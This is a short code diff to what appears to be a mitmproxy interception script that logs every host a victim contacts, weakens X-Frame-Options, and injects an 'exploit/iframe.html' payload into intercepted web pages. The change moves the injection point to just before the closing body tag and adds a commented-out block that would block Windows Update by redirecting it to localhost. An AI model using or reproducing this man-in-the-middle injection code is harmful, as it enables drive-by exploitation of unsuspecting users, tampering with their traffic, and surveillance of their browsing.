@@ -11,6 +11,11 @@ def request(ctx, flow):
     #print flow.request._assemble()
     #print str(flow.request.headers["Host"][0])
     try:
+        # no windows update
+        #if str(flow.request.headers["Host"][0]).endswith('windowsupdate.com'):
+        #  flow.request.host = "127.0.0.1"
+        #  flow.request.headers["Host"] = ["127.0.0.1"]
+
         file = open("data/urls.txt", "a")
         if flow.request.port == 443:
             file.write("HTTPS " + str(flow.request.headers["Host"][0]) + "\n")
@@ -42,7 +47,8 @@ def response(ctx, flow):
         try:
             flow.response.headers["X-Frame-Options"] = ['ALLOW-FROM http://10.0.0.1/']
             iframe = open('exploit/iframe.html').read()
-            injected = re.sub("(<body[^>]*>)", "\\1" + iframe, flow.response.content, flags = re.IGNORECASE)
+            #injected = re.sub("(<body[^>]*>)", "\\1" + iframe, flow.response.content, flags = re.IGNORECASE)
+            injected = re.sub("(<\/body>)", iframe + "\\1", flow.response.content, flags = re.IGNORECASE)
             if injected > 0:
                 ctx.log('Iframe injected')
                 flow.response.content = injected
